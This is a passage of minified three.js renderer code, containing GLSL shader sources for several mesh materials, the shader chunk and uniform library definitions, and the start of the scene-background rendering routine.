	varying vec3 vViewPosition;
#endif
#include <uv_pars_fragment>
#include <normal_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( 0.0, 0.0, 0.0, opacity );
	#include <clipping_planes_fragment>
	#include <logdepthbuf_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	gl_FragColor = vec4( normalize( normal ) * 0.5 + 0.5, diffuseColor.a );
	#ifdef OPAQUE
		gl_FragColor.a = 1.0;
	#endif
}`,Q1=`#define PHONG
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphinstance_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,eT=`#define PHONG
uniform vec3 diffuse;
uniform vec3 emissive;
uniform vec3 specular;
uniform float shininess;
uniform float opacity;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_phong_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_phong_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,tT=`#define STANDARD
varying vec3 vViewPosition;
#ifdef USE_TRANSMISSION
	varying vec3 vWorldPosition;
#endif
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
#ifdef USE_TRANSMISSION
	vWorldPosition = worldPosition.xyz;
#endif
}`,nT=`#define STANDARD
#ifdef PHYSICAL
	#define IOR
	#define USE_SPECULAR
#endif
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float roughness;
uniform float metalness;
uniform float opacity;
#ifdef IOR
	uniform float ior;
#endif
#ifdef USE_SPECULAR
	uniform float specularIntensity;
	uniform vec3 specularColor;
	#ifdef USE_SPECULAR_COLORMAP
		uniform sampler2D specularColorMap;
	#endif
	#ifdef USE_SPECULAR_INTENSITYMAP
		uniform sampler2D specularIntensityMap;
	#endif
#endif
#ifdef USE_CLEARCOAT
	uniform float clearcoat;
	uniform float clearcoatRoughness;
#endif
#ifdef USE_DISPERSION
	uniform float dispersion;
#endif
#ifdef USE_IRIDESCENCE
	uniform float iridescence;
	uniform float iridescenceIOR;
	uniform float iridescenceThicknessMinimum;
	uniform float iridescenceThicknessMaximum;
#endif
#ifdef USE_SHEEN
	uniform vec3 sheenColor;
	uniform float sheenRoughness;
	#ifdef USE_SHEEN_COLORMAP
		uniform sampler2D sheenColorMap;
	#endif
	#ifdef USE_SHEEN_ROUGHNESSMAP
		uniform sampler2D sheenRoughnessMap;
	#endif
#endif
#ifdef USE_ANISOTROPY
	uniform vec2 anisotropyVector;
	#ifdef USE_ANISOTROPYMAP
		uniform sampler2D anisotropyMap;
	#endif
#endif
varying vec3 vViewPosition;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <iridescence_fragment>
#include <cube_uv_reflection_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_physical_pars_fragment>
#include <fog_pars_fragment>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_physical_pars_fragment>
#include <transmission_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <clearcoat_pars_fragment>
#include <iridescence_pars_fragment>
#include <roughnessmap_pars_fragment>
#include <metalnessmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <roughnessmap_fragment>
	#include <metalnessmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <clearcoat_normal_fragment_begin>
	#include <clearcoat_normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_physical_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 totalDiffuse = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse;
	vec3 totalSpecular = reflectedLight.directSpecular + reflectedLight.indirectSpecular;
	#include <transmission_fragment>
	vec3 outgoingLight = totalDiffuse + totalSpecular + totalEmissiveRadiance;
	#ifdef USE_SHEEN
 
		outgoingLight = outgoingLight + sheenSpecularDirect + sheenSpecularIndirect;
 
 	#endif
	#ifdef USE_CLEARCOAT
		float dotNVcc = saturate( dot( geometryClearcoatNormal, geometryViewDir ) );
		vec3 Fcc = F_Schlick( material.clearcoatF0, material.clearcoatF90, dotNVcc );
		outgoingLight = outgoingLight * ( 1.0 - material.clearcoat * Fcc ) + ( clearcoatSpecularDirect + clearcoatSpecularIndirect ) * material.clearcoat;
	#endif
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,iT=`#define TOON
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,sT=`#define TOON
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float opacity;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <gradientmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_toon_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_toon_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,rT=`uniform float size;
uniform float scale;
#include <common>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
#ifdef USE_POINTS_UV
	varying vec2 vUv;
	uniform mat3 uvTransform;
#endif
void main() {
	#ifdef USE_POINTS_UV
		vUv = ( uvTransform * vec3( uv, 1 ) ).xy;
	#endif
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <project_vertex>
	gl_PointSize = size;
	#ifdef USE_SIZEATTENUATION
		bool isPerspective = isPerspectiveMatrix( projectionMatrix );
		if ( isPerspective ) gl_PointSize *= ( scale / - mvPosition.z );
	#endif
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <worldpos_vertex>
	#include <fog_vertex>
}`,aT=`uniform vec3 diffuse;
uniform float opacity;
#include <common>
#include <color_pars_fragment>
#include <map_particle_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	vec3 outgoingLight = vec3( 0.0 );
	#include <logdepthbuf_fragment>
	#include <map_particle_fragment>
	#include <color_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
}`,oT=`#include <common>
#include <batching_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <shadowmap_pars_vertex>
void main() {
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphinstance_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,lT=`uniform vec3 color;
uniform float opacity;
#include <common>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <logdepthbuf_pars_fragment>
#include <shadowmap_pars_fragment>
#include <shadowmask_pars_fragment>
void main() {
	#include <logdepthbuf_fragment>
	gl_FragColor = vec4( color, opacity * ( 1.0 - getShadowMask() ) );
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
}`,cT=`uniform float rotation;
uniform vec2 center;
#include <common>
#include <uv_pars_vertex>
#include <fog_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	vec4 mvPosition = modelViewMatrix[ 3 ];
	vec2 scale = vec2( length( modelMatrix[ 0 ].xyz ), length( modelMatrix[ 1 ].xyz ) );
	#ifndef USE_SIZEATTENUATION
		bool isPerspective = isPerspectiveMatrix( projectionMatrix );
		if ( isPerspective ) scale *= - mvPosition.z;
	#endif
	vec2 alignedPosition = ( position.xy - ( center - vec2( 0.5 ) ) ) * scale;
	vec2 rotatedPosition;
	rotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;
	rotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;
	mvPosition.xy += rotatedPosition;
	gl_Position = projectionMatrix * mvPosition;
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
}`,uT=`uniform vec3 diffuse;
uniform float opacity;
#include <common>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	vec3 outgoingLight = vec3( 0.0 );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
}`,Oe={alphahash_fragment:PM,alphahash_pars_fragment:NM,alphamap_fragment:IM,alphamap_pars_fragment:DM,alphatest_fragment:UM,alphatest_pars_fragment:OM,aomap_fragment:FM,aomap_pars_fragment:BM,batching_pars_vertex:zM,batching_vertex:VM,begin_vertex:HM,beginnormal_vertex:GM,bsdfs:WM,iridescence_fragment:jM,bumpmap_pars_fragment:XM,clipping_planes_fragment:qM,clipping_planes_pars_fragment:YM,clipping_planes_pars_vertex:$M,clipping_planes_vertex:KM,color_fragment:ZM,color_pars_fragment:JM,color_pars_vertex:QM,color_vertex:eE,common:tE,cube_uv_reflection_fragment:nE,defaultnormal_vertex:iE,displacementmap_pars_vertex:sE,displacementmap_vertex:rE,emissivemap_fragment:aE,emissivemap_pars_fragment:oE,colorspace_fragment:lE,colorspace_pars_fragment:cE,envmap_fragment:uE,envmap_common_pars_fragment:dE,envmap_pars_fragment:hE,envmap_pars_vertex:pE,envmap_physical_pars_fragment:ME,envmap_vertex:fE,fog_vertex:mE,fog_pars_vertex:gE,fog_fragment:vE,fog_pars_fragment:yE,gradientmap_pars_fragment:xE,lightmap_pars_fragment:_E,lights_lambert_fragment:bE,lights_lambert_pars_fragment:SE,lights_pars_begin:wE,lights_toon_fragment:EE,lights_toon_pars_fragment:TE,lights_phong_fragment:AE,lights_phong_pars_fragment:CE,lights_physical_fragment:RE,lights_physical_pars_fragment:kE,lights_fragment_begin:LE,lights_fragment_maps:PE,lights_fragment_end:NE,logdepthbuf_fragment:IE,logdepthbuf_pars_fragment:DE,logdepthbuf_pars_vertex:UE,logdepthbuf_vertex:OE,map_fragment:FE,map_pars_fragment:BE,map_particle_fragment:zE,map_particle_pars_fragment:VE,metalnessmap_fragment:HE,metalnessmap_pars_fragment:GE,morphinstance_vertex:WE,morphcolor_vertex:jE,morphnormal_vertex:XE,morphtarget_pars_vertex:qE,morphtarget_vertex:YE,normal_fragment_begin:$E,normal_fragment_maps:KE,normal_pars_fragment:ZE,normal_pars_vertex:JE,normal_vertex:QE,normalmap_pars_fragment:e1,clearcoat_normal_fragment_begin:t1,clearcoat_normal_fragment_maps:n1,clearcoat_pars_fragment:i1,iridescence_pars_fragment:s1,opaque_fragment:r1,packing:a1,premultiplied_alpha_fragment:o1,project_vertex:l1,dithering_fragment:c1,dithering_pars_fragment:u1,roughnessmap_fragment:d1,roughnessmap_pars_fragment:h1,shadowmap_pars_fragment:p1,shadowmap_pars_vertex:f1,shadowmap_vertex:m1,shadowmask_pars_fragment:g1,skinbase_vertex:v1,skinning_pars_vertex:y1,skinning_vertex:x1,skinnormal_vertex:_1,specularmap_fragment:b1,specularmap_pars_fragment:S1,tonemapping_fragment:w1,tonemapping_pars_fragment:M1,transmission_fragment:E1,transmission_pars_fragment:T1,uv_pars_fragment:A1,uv_pars_vertex:C1,uv_vertex:R1,worldpos_vertex:k1,background_vert:L1,background_frag:P1,backgroundCube_vert:N1,backgroundCube_frag:I1,cube_vert:D1,cube_frag:U1,depth_vert:O1,depth_frag:F1,distance_vert:B1,distance_frag:z1,equirect_vert:V1,equirect_frag:H1,linedashed_vert:G1,linedashed_frag:W1,meshbasic_vert:j1,meshbasic_frag:X1,meshlambert_vert:q1,meshlambert_frag:Y1,meshmatcap_vert:$1,meshmatcap_frag:K1,meshnormal_vert:Z1,meshnormal_frag:J1,meshphong_vert:Q1,meshphong_frag:eT,meshphysical_vert:tT,meshphysical_frag:nT,meshtoon_vert:iT,meshtoon_frag:sT,points_vert:rT,points_frag:aT,shadow_vert:oT,shadow_frag:lT,sprite_vert:cT,sprite_frag:uT},pe={common:{diffuse:{value:new Xe(16777215)},opacity:{value:1},map:{value:null},mapTransform:{value:new Ue},alphaMap:{value:null},alphaMapTransform:{value:new Ue},alphaTest:{value:0}},specularmap:{specularMap:{value:null},specularMapTransform:{value:new Ue}},envmap:{envMap:{value:null},envMapRotation:{value:new Ue},flipEnvMap:{value:-1},reflectivity:{value:1},ior:{value:1.5},refractionRatio:{value:.98},dfgLUT:{value:null}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1},aoMapTransform:{value:new Ue}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1},lightMapTransform:{value:new Ue}},bumpmap:{bumpMap:{value:null},bumpMapTransform:{value:new Ue},bumpScale:{value:1}},normalmap:{normalMap:{value:null},normalMapTransform:{value:new Ue},normalScale:{value:new Je(1,1)}},displacementmap:{displacementMap:{value:null},displacementMapTransform:{value:new Ue},displacementScale:{value:1},displacementBias:{value:0}},emissivemap:{emissiveMap:{value:null},emissiveMapTransform:{value:new Ue}},metalnessmap:{metalnessMap:{value:null},metalnessMapTransform:{value:new Ue}},roughnessmap:{roughnessMap:{value:null},roughnessMapTransform:{value:new Ue}},gradientmap:{gradientMap:{value:null}},fog:{fogDensity:{value:25e-5},fogNear:{value:1},fogFar:{value:2e3},fogColor:{value:new Xe(16777215)}},lights:{ambientLightColor:{value:[]},lightProbe:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{}}},directionalLightShadows:{value:[],properties:{shadowIntensity:1,shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMap:{value:[]},directionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},direction:{},distance:{},coneCos:{},penumbraCos:{},decay:{}}},spotLightShadows:{value:[],properties:{shadowIntensity:1,shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},spotLightMap:{value:[]},spotShadowMap:{value:[]},spotLightMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{}}},pointLightShadows:{value:[],properties:{shadowIntensity:1,shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{},shadowCameraNear:{},shadowCameraFar:{}}},pointShadowMap:{value:[]},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},skyColor:{},groundColor:{}}},rectAreaLights:{value:[],properties:{color:{},position:{},width:{},height:{}}},ltc_1:{value:null},ltc_2:{value:null}},points:{diffuse:{value:new Xe(16777215)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},alphaMap:{value:null},alphaMapTransform:{value:new Ue},alphaTest:{value:0},uvTransform:{value:new Ue}},sprite:{diffuse:{value:new Xe(16777215)},opacity:{value:1},center:{value:new Je(.5,.5)},rotation:{value:0},map:{value:null},mapTransform:{value:new Ue},alphaMap:{value:null},alphaMapTransform:{value:new Ue},alphaTest:{value:0}}},ni={basic:{uniforms:Jt([pe.common,pe.specularmap,pe.envmap,pe.aomap,pe.lightmap,pe.fog]),vertexShader:Oe.meshbasic_vert,fragmentShader:Oe.meshbasic_frag},lambert:{uniforms:Jt([pe.common,pe.specularmap,pe.envmap,pe.aomap,pe.lightmap,pe.emissivemap,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.fog,pe.lights,{emissive:{value:new Xe(0)}}]),vertexShader:Oe.meshlambert_vert,fragmentShader:Oe.meshlambert_frag},phong:{uniforms:Jt([pe.common,pe.specularmap,pe.envmap,pe.aomap,pe.lightmap,pe.emissivemap,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.fog,pe.lights,{emissive:{value:new Xe(0)},specular:{value:new Xe(1118481)},shininess:{value:30}}]),vertexShader:Oe.meshphong_vert,fragmentShader:Oe.meshphong_frag},standard:{uniforms:Jt([pe.common,pe.envmap,pe.aomap,pe.lightmap,pe.emissivemap,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.roughnessmap,pe.metalnessmap,pe.fog,pe.lights,{emissive:{value:new Xe(0)},roughness:{value:1},metalness:{value:0},envMapIntensity:{value:1}}]),vertexShader:Oe.meshphysical_vert,fragmentShader:Oe.meshphysical_frag},toon:{uniforms:Jt([pe.common,pe.aomap,pe.lightmap,pe.emissivemap,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.gradientmap,pe.fog,pe.lights,{emissive:{value:new Xe(0)}}]),vertexShader:Oe.meshtoon_vert,fragmentShader:Oe.meshtoon_frag},matcap:{uniforms:Jt([pe.common,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.fog,{matcap:{value:null}}]),vertexShader:Oe.meshmatcap_vert,fragmentShader:Oe.meshmatcap_frag},points:{uniforms:Jt([pe.points,pe.fog]),vertexShader:Oe.points_vert,fragmentShader:Oe.points_frag},dashed:{uniforms:Jt([pe.common,pe.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:Oe.linedashed_vert,fragmentShader:Oe.linedashed_frag},depth:{uniforms:Jt([pe.common,pe.displacementmap]),vertexShader:Oe.depth_vert,fragmentShader:Oe.depth_frag},normal:{uniforms:Jt([pe.common,pe.bumpmap,pe.normalmap,pe.displacementmap,{opacity:{value:1}}]),vertexShader:Oe.meshnormal_vert,fragmentShader:Oe.meshnormal_frag},sprite:{uniforms:Jt([pe.sprite,pe.fog]),vertexShader:Oe.sprite_vert,fragmentShader:Oe.sprite_frag},background:{uniforms:{uvTransform:{value:new Ue},t2D:{value:null},backgroundIntensity:{value:1}},vertexShader:Oe.background_vert,fragmentShader:Oe.background_frag},backgroundCube:{uniforms:{envMap:{value:null},flipEnvMap:{value:-1},backgroundBlurriness:{value:0},backgroundIntensity:{value:1},backgroundRotation:{value:new Ue}},vertexShader:Oe.backgroundCube_vert,fragmentShader:Oe.backgroundCube_frag},cube:{uniforms:{tCube:{value:null},tFlip:{value:-1},opacity:{value:1}},vertexShader:Oe.cube_vert,fragmentShader:Oe.cube_frag},equirect:{uniforms:{tEquirect:{value:null}},vertexShader:Oe.equirect_vert,fragmentShader:Oe.equirect_frag},distance:{uniforms:Jt([pe.common,pe.displacementmap,{referencePosition:{value:new G},nearDistance:{value:1},farDistance:{value:1e3}}]),vertexShader:Oe.distance_vert,fragmentShader:Oe.distance_frag},shadow:{uniforms:Jt([pe.lights,pe.fog,{color:{value:new Xe(0)},opacity:{value:1}}]),vertexShader:Oe.shadow_vert,fragmentShader:Oe.shadow_frag}};ni.physical={uniforms:Jt([ni.standard.uniforms,{clearcoat:{value:0},clearcoatMap:{value:null},clearcoatMapTransform:{value:new Ue},clearcoatNormalMap:{value:null},clearcoatNormalMapTransform:{value:new Ue},clearcoatNormalScale:{value:new Je(1,1)},clearcoatRoughness:{value:0},clearcoatRoughnessMap:{value:null},clearcoatRoughnessMapTransform:{value:new Ue},dispersion:{value:0},iridescence:{value:0},iridescenceMap:{value:null},iridescenceMapTransform:{value:new Ue},iridescenceIOR:{value:1.3},iridescenceThicknessMinimum:{value:100},iridescenceThicknessMaximum:{value:400},iridescenceThicknessMap:{value:null},iridescenceThicknessMapTransform:{value:new Ue},sheen:{value:0},sheenColor:{value:new Xe(0)},sheenColorMap:{value:null},sheenColorMapTransform:{value:new Ue},sheenRoughness:{value:1},sheenRoughnessMap:{value:null},sheenRoughnessMapTransform:{value:new Ue},transmission:{value:0},transmissionMap:{value:null},transmissionMapTransform:{value:new Ue},transmissionSamplerSize:{value:new Je},transmissionSamplerMap:{value:null},thickness:{value:0},thicknessMap:{value:null},thicknessMapTransform:{value:new Ue},attenuationDistance:{value:0},attenuationColor:{value:new Xe(0)},specularColor:{value:new Xe(1,1,1)},specularColorMap:{value:null},specularColorMapTransform:{value:new Ue},specularIntensity:{value:1},specularIntensityMap:{value:null},specularIntensityMapTransform:{value:new Ue},anisotropyVector:{value:new Je},anisotropyMap:{value:null},anisotropyMapTransform:{value:new Ue}}]),vertexShader:Oe.meshphysical_vert,fragmentShader:Oe.meshphysical_frag};const Yo={r:0,b:0,g:0},Ss=new hi,dT=new St;function hT(t,e,n,i,s,r,a){const o=new Xe(0);let l=r===!0?0:1,c,h,d=null,p=0,f=null;function y(x){let S=x.isScene===!0?x.background:null;return S&&S.isTexture&&(S=(x.backgroundBlurriness>0?n:e).get(S)),S}function _(x){let S=!1;const E=y(x);E===null?u(o,l):E&&E.isColor&&(u(E,1),S=!0);const A=t.xr.getEnvironmentBlendMode();A==="additive"?i.buffers.color.setClear(0,0,0,1,a):A==="alpha-blend"&&i.buffers.color.setClear(0,0,0,0,a),(t.autoClear||S)&&(i.buffers.depth.setTest(!0),i.buffers.depth.setMask(!0),i.buffers.color.setMask(!0),t.clear(t.autoClearColor,t.autoClearDepth,t.autoClearStencil))}function g(x,S){const E=y(S);E&&(E.isCubeTexture||E.mapping===ac)?(h===void 0&&(h=new In(new oo(1,1,1),new pi({name:"BackgroundCubeMaterial",uniforms:Br(ni.backgroundCube.uniforms),vertexShader:ni.backgroundCube.vertexShader,fragmentShader:ni.backgroundCube.fragmentShader,side:pn,depthTest:!1,depthWrite:!1,fog:!1,allowOverride:!1})),h.geometry.deleteAttribute("normal"),h.geometry.deleteAttribute("uv"),h.onBeforeRender=function(A,C,L){this.matrixWorld.copyPosition(L.matrixWorld)},Object.defineProperty(h.material,"envMap",{get:function(){return this.uniforms.envMap.value}}),s.update(h)),Ss.copy(S.backgroundRotation),Ss.x*=-1,Ss.y*=-1,Ss.z*=-1,E.isCubeTexture&&E.isRenderTargetTexture===!1&&(Ss.y*=-1,Ss.z*=-1),h.material.uniforms.envMap.value=E,h.material.uniforms.flipEnvMap.value=E.isCubeTexture&&E.isRenderTargetTexture===!1?-1:1,h.material.uniforms.backgroundBlurriness.value=S.backgroundBlurriness,h.material.uniforms.backgroundIntensity.value=S.backgroundIntensity,h.material.uniforms.backgroundRotation.value.setFromMatrix4(dT.makeRotationFromEuler(Ss)),h.material.toneMapped=je.getTransfer(E.colorSpace)!==it,(d!==E||p!==E.version||f!==t.toneMapping)&&(h.material.needsUpdate=!0,d=E,p=E.version,f=t.toneMapping),h.layers.enableAll(),x.unshift(h,h.geometry,h.material,0,0,null)):E&&E.isTexture&&(c===void 0&&(c=new In(new 